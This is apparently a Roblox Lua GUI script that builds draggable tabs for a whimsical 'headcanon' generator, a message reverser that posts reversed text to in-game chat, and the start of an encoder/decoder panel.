	"%s always drags %s into ridiculous bets they somehow win.",
	"%s and %s accidentally started a rumor that theyre dating. neither denied it.",
	"%s and %s text each other with brainrot and internet slang exclusively.",
	"%s claims they hate %s's cooking but always asks for seconds.",
	"%s and %s once tried to learn a tiktok dance and destroyed a lamp.",
	"%s calls %s at 3am to discuss unhinged conspiracy theories.",
	"%s and %s co-own a pet snail they treat like royalty.",
	"%s writes poetry about %s and pretends its for class.",
	"%s and %s prank each other with fake love letters regularly.",
	"%s and %s once played a board game for 7 hours and still argue about who won.",
	"%s keeps pretending not to know %s's birthday.",
	"%s and %s tried to switch identities for a day. it worked way too well.",
	"%s and %s argue over fictional ships like their lives depend on it.",
	"%s saved %s's life once and will never let them forget it.",
	"%s and %s made a secret handshake with 12 steps and a dramatic pose.",
	"%s and %s once pretended to be ghosts to scare a tour group.",
	"%s and %s once tried to bake a cake but accidentally used salt instead of sugar and still ate it out of spite.",
	"%s keeps stealing %s's left sock just to mess with them.",
	"%s and %s once got lost in ikea for three hours and now refuse to go back.",
	"%s writes dramatic fanfiction about %s's mundane life and reads it aloud at parties.",
	"%s keeps a list of %s's weirdest quotes and plans to publish them someday.",
	"%s sends %s cryptic postcards from their own city to confuse them.",
	"%s and %s have an elaborate system of code words for when theyre bored in public.",
	"%s convinced %s that pigeons are government drones and now they cant unsee it.",
	"%s and %s once spent an entire road trip debating whether a hotdog is a sandwich.",
	"%s keeps \"accidentally\" setting %s's netflix profile to kids mode.",
	"%s and %s have a shared soundcloud playlist thats just full of phonk music.",
	"%s once replaced all of %s's desktop icons with pictures of josh hutcherson.",
	"%s and %s have a competition to see who can sneak the weirdest item into the others bag.",
	"%s convinced %s that theyre allergic to a completely normal food just to mess with them.",
	"%s keeps sending %s anonymous gifts signed \"your secret admirer\" and its obviously them.",
	"%s and %s argue for hours about which of their favorite songs is better.",
	"%s and %s bake cookies together but end up starting a flour fight.",
	"%s keeps stealing %s's hoodies and denying it even though theyre wearing one.",
	"%s and %s have an ongoing prank war that has escalated to ridiculous proportions.",
	"%s and %s always end up talking in weird accents when theyre together.",
	"%s and %s get way too competitive playing board games.",
	"%s and %s pretend to be married at restaurants to get free dessert.",
	"%s always drags %s into their spontaneous dance parties.",
	"%s and %s have a playlist of songs that remind them of each other.",
	"%s and %s have a jar where they write down future adventure ideas together.",
	"%s and %s keep getting mistaken for siblings and just roll with it.",
	"%s and %s have a tradition of making breakfast for each other on sundays.",
	"%s loves to dramatically read bedtime stories to %s like a soap opera.",
	"%s and %s built a pillow fort and refuse to let anyone else in.",
	"%s and %s have an annual snowball fight that gets very intense.",
	"%s and %s are always up for late night fast food runs together.",
	"%s and %s get into debates about which animals would make the best roommates.",
	"%s and %s have a shared playlist they keep adding random songs to.",
	"%s and %s act like secret agents when theyre in the grocery store together.",
	"%s and %s always go to haunted houses together even though theyre both scared.",
	"%s made %s a crown out of flowers and insists they wear it like royalty.",
	"%s and %s try out new hobbies together and usually fail hilariously.",
	"%s and %s have matching keychains and swear its not on purpose.",
	"%s always makes up new nicknames for %s just to see their reaction.",
	"%s and %s have an ongoing debate about pineapple on pizza.",
	"%s and %s have an elaborate story about how they met that they tell everyone.",
	"%s always challenges %s to race them home, even if its only a block away.",
	"%s and %s have a shared love for terrible puns and make them constantly.",
	"%s and %s always sing duets at karaoke night, no matter the song.",
	"%s and %s have matching water bottles they refuse to lose.",
	"%s and %s once swapped clothes for a day just to confuse everyone.",
	"%s and %s always try to guess what the other is thinking (and theyre usually wrong).",
	"%s and %s once tried to make a fancy dinner but ended up ordering takeout instead.",
}

local lastIndex_one = nil
local lastIndex_two = nil

function ghc(name1, name2)
	if name1 and name1:match("%S") and (not name2 or not name2:match("%S")) then
		local index
		repeat
			index = math.random(1, #hcs_one)
		until index ~= lastIndex_one or #hcs_one == 1

		lastIndex_one = index
		return string.format(hcs_one[index], name1)

	elseif name1 and name1:match("%S") and name2 and name2:match("%S") then
		local index
		repeat
			index = math.random(1, #hcs_two)
		until index ~= lastIndex_two or #hcs_two == 1

		lastIndex_two = index
		return string.format(hcs_two[index], name1, name2)
	end
end

box["generate headcanon"].MouseButton1Click:Connect(function()
	playclicksound()
	local name1 = box["headcanon generator input"].Text
	local name2 = box["headcanon generator input 2"].Text
	local outputBox = box["headcanon generator output"]

	if name1 and name1:match("%S") then
		local result = ghc(name1, name2)
		outputBox.Text = result or "..."
	else
		outputBox.Text = "..."
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab block main frame"].Size = UDim2.new(0, 476, 0, 168)
box["headcanon generator tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["headcanon generator tab block main frame"].BackgroundColor3 = box["default background color"]

box["headcanon generator tab block main frame"].BorderColor3 = box["default border color"]
box["headcanon generator tab block main frame"].BorderSizePixel = 1
box["headcanon generator tab block main frame"].BackgroundTransparency = 1

box["headcanon generator tab block main frame"].Parent = box["headcanon generator tab top bar"]
box["headcanon generator tab block main frame"].ZIndex = 204
box["headcanon generator tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab block all"].Size = UDim2.new(0, 446, 0, 170)
box["headcanon generator tab block all"].Position = UDim2.new(0, 0, 0, 0)

box["headcanon generator tab block all"].BackgroundColor3 = box["default background color"]

box["headcanon generator tab block all"].BorderColor3 = box["default border color"]
box["headcanon generator tab block all"].BorderSizePixel = 1
box["headcanon generator tab block all"].BackgroundTransparency = 0

box["headcanon generator tab block all"].Parent = box["headcanon generator tab top bar"]
box["headcanon generator tab block all"].ZIndex = 205
box["headcanon generator tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab top bar"].Size = UDim2.new(0, 345, 0, 26)

box["message reverser tab top bar"].BackgroundColor3 = box["default background color"]

box["message reverser tab top bar"].BorderColor3 = box["default border color"]
box["message reverser tab top bar"].BorderSizePixel = 1

box["message reverser tab top bar"].TextColor3 = box["default border color"]
box["message reverser tab top bar"].Font = Enum.Font.RobotoMono
box["message reverser tab top bar"].TextSize = 15
box["message reverser tab top bar"].TextScaled = false
box["message reverser tab top bar"].Text = " message reverser.lua o.o"
box["message reverser tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["message reverser tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["message reverser top bar text padding"] = Instance.new("UIPadding")
box["message reverser top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["message reverser top bar text padding"].PaddingRight = UDim.new(0, 0)
box["message reverser top bar text padding"].Parent = box["message reverser tab top bar"]

box["message reverser tab top bar"].Parent = box["screen gui"]
box["message reverser tab top bar"].ZIndex = 703
box["message reverser tab top bar"].Visible = false

function dragmsgrevtabtopbar()
	local frame = box["message reverser tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragmsgrevtabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["message reverser tab top bar close button"].Position = UDim2.new(0, 323, 0, 4.7)

box["message reverser tab top bar close button"].BackgroundColor3 = box["default background color"]

box["message reverser tab top bar close button"].BorderColor3 = box["default border color"]
box["message reverser tab top bar close button"].BorderSizePixel = 1

box["message reverser tab top bar close button"].TextColor3 = box["default border color"]
box["message reverser tab top bar close button"].Font = Enum.Font.RobotoMono
box["message reverser tab top bar close button"].TextSize = 16
box["message reverser tab top bar close button"].TextScaled = false
box["message reverser tab top bar close button"].Text = "X"
box["message reverser tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["message reverser tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["message reverser tab top bar close button"].Parent = box["message reverser tab top bar"]
box["message reverser tab top bar close button"].ZIndex = 704

box["message reverser tab top bar close button text padding"] = Instance.new("UIPadding")
box["message reverser tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["message reverser tab top bar close button text padding"].Parent = box["message reverser tab top bar close button"]

box["message reverser tab top bar close button"].MouseButton1Click:Connect(function()
	if not msgrevcanminimize then return end
	msgrevtabopen = false
	msgrevtabminimized = false
	playclicksound()
	box["message reverser tab top bar"].Visible = false
	repos(box["message reverser tab top bar"], 0, 345, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["message reverser tab top bar minimize button"].Position = UDim2.new(0, 299, 0, 4.7)

box["message reverser tab top bar minimize button"].BackgroundColor3 = box["default background color"]

box["message reverser tab top bar minimize button"].BorderColor3 = box["default border color"]
box["message reverser tab top bar minimize button"].BorderSizePixel = 1

box["message reverser tab top bar minimize button"].TextColor3 = box["default border color"]
box["message reverser tab top bar minimize button"].Font = Enum.Font.RobotoMono
box["message reverser tab top bar minimize button"].TextSize = 16
box["message reverser tab top bar minimize button"].TextScaled = false
box["message reverser tab top bar minimize button"].Visible = true
box["message reverser tab top bar minimize button"].Text = "-"
box["message reverser tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["message reverser tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["message reverser tab top bar minimize button"].Parent = box["message reverser tab top bar"]
box["message reverser tab top bar minimize button"].ZIndex = 704

box["message reverser tab top bar minimize button text padding"] = Instance.new("UIPadding")
box["message reverser tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["message reverser tab top bar minimize button text padding"].Parent = box["message reverser tab top bar minimize button"]

msgrevtabminimized = false
msgrevcanminimize = true

box["message reverser tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not msgrevcanminimize then return end
	spawn(playclicksound)
	msgrevcanminimize = false

	msgrevtabminimized = not msgrevtabminimized

	if msgrevtabminimized then
		box["message reverser tab top bar minimize button"].Text = "+"
		box["message reverser tab block main frame"].Visible = true

		local fadeTween = fade(box["message reverser tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		box["message reverser tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			box["message reverser tab block main frame"],
			UDim2.new(0, 345, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		msgrevtabreallyminimized = true
		box["message reverser tab block main frame"].Visible = false
		updcols()
	else
		box["message reverser tab top bar minimize button"].Text = "-"
		box["message reverser tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			box["message reverser tab block main frame"],
			UDim2.new(0, 345, 0, 141),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		box["message reverser tab main frame 1"].Visible = true

		local fadeTween = fade(box["message reverser tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		msgrevtabreallyminimized = false
		box["message reverser tab block main frame"].Visible = false
		updcols()
	end

	msgrevcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["message reverser tab top bar reposition button"].Position = UDim2.new(0, 275, 0, 4.7)

box["message reverser tab top bar reposition button"].BackgroundColor3 = box["default background color"]

box["message reverser tab top bar reposition button"].BorderColor3 = box["default border color"]
box["message reverser tab top bar reposition button"].BorderSizePixel = 1

box["message reverser tab top bar reposition button"].TextColor3 = box["default border color"]
box["message reverser tab top bar reposition button"].Font = Enum.Font.RobotoMono
box["message reverser tab top bar reposition button"].TextSize = 16
box["message reverser tab top bar reposition button"].TextScaled = false
box["message reverser tab top bar reposition button"].Text = "R"
box["message reverser tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["message reverser tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["message reverser tab top bar reposition button"].Parent = box["message reverser tab top bar"]
box["message reverser tab top bar reposition button"].ZIndex = 704

box["message reverser tab top bar reposition button text padding"] = Instance.new("UIPadding")
box["message reverser tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["message reverser tab top bar reposition button text padding"].Parent = box["message reverser tab top bar reposition button"]

box["message reverser tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["message reverser tab top bar"], 0.5, 345, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab main frame 1"].Size = UDim2.new(0, 345, 0, 142)
box["message reverser tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["message reverser tab main frame 1"].BackgroundColor3 = box["default background color"]

box["message reverser tab main frame 1"].BorderColor3 = box["default border color"]
box["message reverser tab main frame 1"].BorderSizePixel = 1

box["message reverser tab main frame 1"].Parent = box["message reverser tab top bar"]
box["message reverser tab main frame 1"].ZIndex = 702

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser input"].Size = UDim2.new(0, 337, 0, 87)
box["message reverser input"].Position = UDim2.new(0, 4, 0, 5)

box["message reverser input"].BackgroundColor3 = box["default background color"]

box["message reverser input"].BorderColor3 = box["default border color"]
box["message reverser input"].BorderSizePixel = 1

box["message reverser input"].Parent = box["message reverser tab main frame 1"]
box["message reverser input"].ZIndex = 703

box["message reverser input"].Font = Enum.Font.RobotoMono
box["message reverser input"].TextColor3 = Color3.new(1, 1, 1)
box["message reverser input"].TextSize = 15
box["message reverser input"].Text = ""
box["message reverser input"].PlaceholderText = "input message"
box["message reverser input"].PlaceholderColor3 = box["default 1/2 color"]
box["message reverser input"].TextWrapped = true
box["message reverser input"].TextXAlignment = Enum.TextXAlignment.Left
box["message reverser input"].TextYAlignment = Enum.TextYAlignment.Top
box["message reverser input"].ClipsDescendants = true

box["message reverser input max chars"] = 200

box["message reverser input"]:GetPropertyChangedSignal("Text"):Connect(function()
	local inputBox = box["message reverser input"]
	local maxChars = box["message reverser input max chars"]

	if #inputBox.Text > maxChars then
		inputBox.Text = inputBox.Text:sub(1, maxChars)
	end
end)

box["message reverser input text padding"] = Instance.new("UIPadding")
box["message reverser input text padding"].PaddingBottom = UDim.new(0, 4)
box["message reverser input text padding"].PaddingLeft = UDim.new(0, 4)
box["message reverser input text padding"].PaddingRight = UDim.new(0, 4)
box["message reverser input text padding"].PaddingTop = UDim.new(0, 4)
box["message reverser input text padding"].Parent = box["message reverser input"]

box["reverse message"].Size = UDim2.new(0, 166, 0, 41)
box["reverse message"].Position = UDim2.new(0, 4, 0, 97)

box["reverse message"].BackgroundColor3 = box["default background color"]

box["reverse message"].BorderColor3 = box["default border color"]
box["reverse message"].BorderSizePixel = 1

box["reverse message"].Parent = box["message reverser tab main frame 1"]
box["reverse message"].ZIndex = 703

box["reverse message"].Font = Enum.Font.RobotoMono
box["reverse message"].TextColor3 = Color3.new(1, 1, 1)
box["reverse message"].TextSize = 15
box["reverse message"].Text = "send reversed"
box["reverse message"].TextWrapped = true
box["reverse message"].TextXAlignment = Enum.TextXAlignment.Center
box["reverse message"].TextYAlignment = Enum.TextYAlignment.Center
box["reverse message"].ClipsDescendants = true

box["reverse message text padding"] = Instance.new("UIPadding")
box["reverse message text padding"].PaddingBottom = UDim.new(0, 0)
box["reverse message text padding"].Parent = box["reverse message"]

box["clear message reverser input"].Size = UDim2.new(0, 166, 0, 41)
box["clear message reverser input"].Position = UDim2.new(0, 175, 0, 97)

box["clear message reverser input"].BackgroundColor3 = box["default background color"]

box["clear message reverser input"].BorderColor3 = box["default border color"]
box["clear message reverser input"].BorderSizePixel = 1

box["clear message reverser input"].Parent = box["message reverser tab main frame 1"]
box["clear message reverser input"].ZIndex = 703

box["clear message reverser input"].Font = Enum.Font.RobotoMono
box["clear message reverser input"].TextColor3 = Color3.new(1, 1, 1)
box["clear message reverser input"].TextSize = 15
box["clear message reverser input"].Text = "clear"
box["clear message reverser input"].TextWrapped = true
box["clear message reverser input"].TextXAlignment = Enum.TextXAlignment.Center
box["clear message reverser input"].TextYAlignment = Enum.TextYAlignment.Center
box["clear message reverser input"].ClipsDescendants = true

box["clear message reverser input text padding"] = Instance.new("UIPadding")
box["clear message reverser input text padding"].PaddingBottom = UDim.new(0, 0)
box["clear message reverser input text padding"].Parent = box["clear message reverser input"]

box["clear message reverser input"].MouseButton1Click:Connect(function()
	playclicksound()
	box["message reverser input"].Text = ""
end)

box["reverse message"].MouseButton1Click:Connect(function()
	playclicksound()
	local inputBox = box["message reverser input"]
	local reversedText = inputBox.Text:reverse()

	if reversedText == "" then return end

	if box["text chat service"].ChatVersion == Enum.ChatVersion.TextChatService then
		local textChannel = box["text chat service"]:FindFirstChild("TextChannels")
		if textChannel and textChannel:FindFirstChild("RBXGeneral") then
			textChannel.RBXGeneral:SendAsync(reversedText)
		end
	else
		local chatEvent = box["replicated storage"]:FindFirstChild("DefaultChatSystemChatEvents")
		if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
			chatEvent.SayMessageRequest:FireServer(reversedText, "All")
		end
	end
end)

box["message reverser input"].FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local inputBox = box["message reverser input"]
		local reversedText = inputBox.Text:reverse()

		if reversedText == "" then return end

		if box["text chat service"].ChatVersion == Enum.ChatVersion.TextChatService then
			local textChannel = box["text chat service"]:FindFirstChild("TextChannels")
			if textChannel and textChannel:FindFirstChild("RBXGeneral") then
				textChannel.RBXGeneral:SendAsync(reversedText)
				box["message reverser input"].Text = ""
			end
		else
			local chatEvent = box["replicated storage"]:FindFirstChild("DefaultChatSystemChatEvents")
			if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
				chatEvent.SayMessageRequest:FireServer(reversedText, "All")
				box["message reverser input"].Text = ""
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab block main frame"].Size = UDim2.new(0, 375, 0, 168)
box["message reverser tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["message reverser tab block main frame"].BackgroundColor3 = box["default background color"]

box["message reverser tab block main frame"].BorderColor3 = box["default border color"]
box["message reverser tab block main frame"].BorderSizePixel = 1
box["message reverser tab block main frame"].BackgroundTransparency = 1

box["message reverser tab block main frame"].Parent = box["message reverser tab top bar"]
box["message reverser tab block main frame"].ZIndex = 704
box["message reverser tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["message reverser tab block all"].Size = UDim2.new(0, 345, 0, 170)
box["message reverser tab block all"].Position = UDim2.new(0, 0, 0, 0)

box["message reverser tab block all"].BackgroundColor3 = box["default background color"]

box["message reverser tab block all"].BorderColor3 = box["default border color"]
box["message reverser tab block all"].BorderSizePixel = 1
box["message reverser tab block all"].BackgroundTransparency = 0

box["message reverser tab block all"].Parent = box["message reverser tab top bar"]
box["message reverser tab block all"].ZIndex = 705
box["message reverser tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab top bar"].Size = UDim2.new(0, 545, 0, 26)

box["noxsec encoder and decoder tab top bar"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder tab top bar"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar"].BorderSizePixel = 1

box["noxsec encoder and decoder tab top bar"].TextColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar"].Font = Enum.Font.RobotoMono
box["noxsec encoder and decoder tab top bar"].TextSize = 15
box["noxsec encoder and decoder tab top bar"].TextScaled = false
box["noxsec encoder and decoder tab top bar"].Text = " noxsec encoder and decoder.lua o.o"
box["noxsec encoder and decoder tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["noxsec encoder and decoder tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["noxsec encoder and decoder top bar text padding"] = Instance.new("UIPadding")
box["noxsec encoder and decoder top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["noxsec encoder and decoder top bar text padding"].PaddingRight = UDim.new(0, 0)
box["noxsec encoder and decoder top bar text padding"].Parent = box["noxsec encoder and decoder tab top bar"]

box["noxsec encoder and decoder tab top bar"].Parent = box["screen gui"]
box["noxsec encoder and decoder tab top bar"].ZIndex = 803
box["noxsec encoder and decoder tab top bar"].Visible = false

function dragnoxsectabtopbar()
	local frame = box["noxsec encoder and decoder tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragnoxsectabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["noxsec encoder and decoder tab top bar close button"].Position = UDim2.new(0, 523, 0, 4.7)

box["noxsec encoder and decoder tab top bar close button"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder tab top bar close button"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar close button"].BorderSizePixel = 1

box["noxsec encoder and decoder tab top bar close button"].TextColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar close button"].Font = Enum.Font.RobotoMono
box["noxsec encoder and decoder tab top bar close button"].TextSize = 16
box["noxsec encoder and decoder tab top bar close button"].TextScaled = false
box["noxsec encoder and decoder tab top bar close button"].Text = "X"
box["noxsec encoder and decoder tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["noxsec encoder and decoder tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["noxsec encoder and decoder tab top bar close button"].Parent = box["noxsec encoder and decoder tab top bar"]
box["noxsec encoder and decoder tab top bar close button"].ZIndex = 804

box["noxsec encoder and decoder tab top bar close button text padding"] = Instance.new("UIPadding")
box["noxsec encoder and decoder tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["noxsec encoder and decoder tab top bar close button text padding"].Parent = box["noxsec encoder and decoder tab top bar close button"]

box["noxsec encoder and decoder tab top bar close button"].MouseButton1Click:Connect(function()
	if not noxseccanminimize then return end
	noxsectabopen = false
	noxsectabminimized = false
	playclicksound()
	box["noxsec encoder and decoder tab top bar"].Visible = false
	repos(box["noxsec encoder and decoder tab top bar"], 0, 545, 268 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["noxsec encoder and decoder tab top bar minimize button"].Position = UDim2.new(0, 499, 0, 4.7)

box["noxsec encoder and decoder tab top bar minimize button"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder tab top bar minimize button"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar minimize button"].BorderSizePixel = 1

box["noxsec encoder and decoder tab top bar minimize button"].TextColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar minimize button"].Font = Enum.Font.RobotoMono
box["noxsec encoder and decoder tab top bar minimize button"].TextSize = 16
box["noxsec encoder and decoder tab top bar minimize button"].TextScaled = false
box["noxsec encoder and decoder tab top bar minimize button"].Visible = true
box["noxsec encoder and decoder tab top bar minimize button"].Text = "-"
box["noxsec encoder and decoder tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["noxsec encoder and decoder tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["noxsec encoder and decoder tab top bar minimize button"].Parent = box["noxsec encoder and decoder tab top bar"]
box["noxsec encoder and decoder tab top bar minimize button"].ZIndex = 804

box["noxsec encoder and decoder tab top bar minimize button text padding"] = Instance.new("UIPadding")
box["noxsec encoder and decoder tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["noxsec encoder and decoder tab top bar minimize button text padding"].Parent = box["noxsec encoder and decoder tab top bar minimize button"]

noxsectabminimized = false
noxseccanminimize = true

box["noxsec encoder and decoder tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not noxseccanminimize then return end
	spawn(playclicksound)
	noxseccanminimize = false

	noxsectabminimized = not noxsectabminimized

	if noxsectabminimized then
		box["noxsec encoder and decoder tab top bar minimize button"].Text = "+"
		box["noxsec encoder and decoder tab block main frame"].Visible = true

		local fadeTween = fade(box["noxsec encoder and decoder tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		box["noxsec encoder and decoder tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			box["noxsec encoder and decoder tab block main frame"],
			UDim2.new(0, 545, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		noxsectabreallyminimized = true
		box["noxsec encoder and decoder tab block main frame"].Visible = false
		updcols()
	else
		box["noxsec encoder and decoder tab top bar minimize button"].Text = "-"
		box["noxsec encoder and decoder tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			box["noxsec encoder and decoder tab block main frame"],
			UDim2.new(0, 545, 0, 241),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		box["noxsec encoder and decoder tab main frame 1"].Visible = true

		local fadeTween = fade(box["noxsec encoder and decoder tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		noxsectabreallyminimized = false
		box["noxsec encoder and decoder tab block main frame"].Visible = false
		updcols()
	end

	noxseccanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["noxsec encoder and decoder tab top bar reposition button"].Position = UDim2.new(0, 475, 0, 4.7)

box["noxsec encoder and decoder tab top bar reposition button"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder tab top bar reposition button"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar reposition button"].BorderSizePixel = 1

box["noxsec encoder and decoder tab top bar reposition button"].TextColor3 = box["default border color"]
box["noxsec encoder and decoder tab top bar reposition button"].Font = Enum.Font.RobotoMono
box["noxsec encoder and decoder tab top bar reposition button"].TextSize = 16
box["noxsec encoder and decoder tab top bar reposition button"].TextScaled = false
box["noxsec encoder and decoder tab top bar reposition button"].Text = "R"
box["noxsec encoder and decoder tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["noxsec encoder and decoder tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["noxsec encoder and decoder tab top bar reposition button"].Parent = box["noxsec encoder and decoder tab top bar"]
box["noxsec encoder and decoder tab top bar reposition button"].ZIndex = 804

box["noxsec encoder and decoder tab top bar reposition button text padding"] = Instance.new("UIPadding")
box["noxsec encoder and decoder tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["noxsec encoder and decoder tab top bar reposition button text padding"].Parent = box["noxsec encoder and decoder tab top bar reposition button"]

box["noxsec encoder and decoder tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["noxsec encoder and decoder tab top bar"], 0.5, 545, 268 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder tab main frame 1"].Size = UDim2.new(0, 545, 0, 242)
box["noxsec encoder and decoder tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["noxsec encoder and decoder tab main frame 1"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder tab main frame 1"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder tab main frame 1"].BorderSizePixel = 1

box["noxsec encoder and decoder tab main frame 1"].Parent = box["noxsec encoder and decoder tab top bar"]
box["noxsec encoder and decoder tab main frame 1"].ZIndex = 802

-------------------------------------------------------------------------------------------------------------------------------

box["noxsec encoder and decoder input"].Size = UDim2.new(0, 537, 0, 187)
box["noxsec encoder and decoder input"].Position = UDim2.new(0, 4, 0, 5)

box["noxsec encoder and decoder input"].BackgroundColor3 = box["default background color"]

box["noxsec encoder and decoder input"].BorderColor3 = box["default border color"]
box["noxsec encoder and decoder input"].BorderSizePixel = 1

box["noxsec encoder and decoder input"].Parent = box["noxsec encoder and decoder tab main frame 1"]
box["noxsec encoder and decoder input"].ZIndex = 803

box["noxsec encoder and decoder input"].Font = Enum.Font.RobotoMono
box["noxsec encoder and decoder input"].TextColor3 = Color3.new(1, 1, 1)
box["noxsec encoder and decoder input"].TextSize = 15
box["noxsec encoder and decoder input"].Text = ""
box["noxsec encoder and decoder input"].PlaceholderText = "input message"
box["noxsec encoder and decoder input"].PlaceholderColor3 = box["default 1/2 color"]
box["noxsec encoder and decoder input"].TextWrapped = true
box["noxsec encoder and decoder input"].TextXAlignment = Enum.TextXAlignment.Left
box["noxsec encoder and decoder input"].TextYAlignment = Enum.TextYAlignment.Top
box["noxsec encoder and decoder input"].ClipsDescendants = true

